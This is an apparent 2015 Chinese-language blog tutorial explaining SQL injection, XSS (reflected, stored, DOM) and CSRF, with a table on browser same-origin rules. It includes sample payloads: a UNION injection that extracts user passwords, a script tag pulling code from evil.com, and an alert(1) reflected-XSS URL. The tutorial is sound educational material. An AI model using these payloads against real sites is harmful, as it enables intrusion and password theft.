title: 常见的Web攻击方式
date: 2015-10-06 17:20:46
categories:
- 安全
tags:
- 安全
---
这里主要介绍一些常见的web网站攻击的方式，以及概念，并不涉及如何防范， 关于防范后续再做记录

### 1. SQL注入攻击
通过在请求中加入SQL语句片段， 在后端拼接参数时候，会拼装到待执行的SQL中,来查询出更多数据
如：
```
 select username, email, desc from users where id=1;
```
在用户提交请求时候，会带入参数 ?id=1,来获取相应数据。若是不发用户会在参数中添加 :
```
?id=1 union select password, 1, 1 from users, 
```
通过以上参数将组成新的SQL语句如下： 
```
select username, email, desc from users where id=1 union select password,1,1 from users;
```
通过此SQL就能查出用户的密码了

### 2.XSS跨站脚本攻击(Cross Site Script)
发生在目标网站中目标用户的浏览器中，当用户浏览器渲染整个HTML文档的过程中，出现了不被预期的脚本指令并执行时， XSS就会发生。
一般通过注入类似下面的代码引入第三方域上的脚本资源：
```
<script src="http://www.evil.com/xss.js"></script>
```
以上方式有原因如下：

1. 攻击代码容易控制
2. 利用script标签本身就可以嵌入第三方资源的特性，就突破了浏览器的同源策略
#### XSS的类型
1. **反射性XSS(非持久型XSS)**: 发出请求时，XSS代码出现在URL中，作为输入提交到服务器，服务器解析后在响应内容中出现XSS代码， 最后浏览器解析执行。如：若服务器端将参数x不做任何过滤就直接输出
    ```
    http://www.test.com?x=<script>alert(1)</script>
    ```
    那么```<script>alert(1)</script>```就会输出到响应体中，浏览器就会解析执行
2. **存储型XSS(持久型XSS)**
3. **DOM XSS**
##### 浏览器的同源策略
    同源策略： 不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源
1. 如何区分不同域域同域栈 
    同域： 需要满足**同协议，同域名， 同端口**，才能叫做同域： 如
    基准域`http://www.test.com`

    | 站点 | 是否同域| 原因
    |------|---------|-----
    |https://www.test.com | 不同域 | 协议不同， http与https是不同的协议
    |http://blog.test.com|不同域|域名不同，blog与www是不同的子域
    |http://test.com |不同域|域名不同，顶级域域www子域不是一个概念
    |http://www.test.com:8080|不同域|端口不同，8080与默认80为不同端口
    |http://www.test.com/blog/|同域|满足
### 3. CSRF 跨站请求伪造
    通常在使用XSS时，需要目标站点有XSS漏洞，也就是可以执行请求中的脚本代码。若是无XSS漏洞，则无法完成攻击。而CSRF就是在不同域目标网站的站点B中，构造一个访问目标站点的请求，而诱使用户进入构造的B站点中，发起伪造的请求。
    起其好处是： 可以做到无脚本Javascript参与，轻松绕过不同域的跨域请求问题。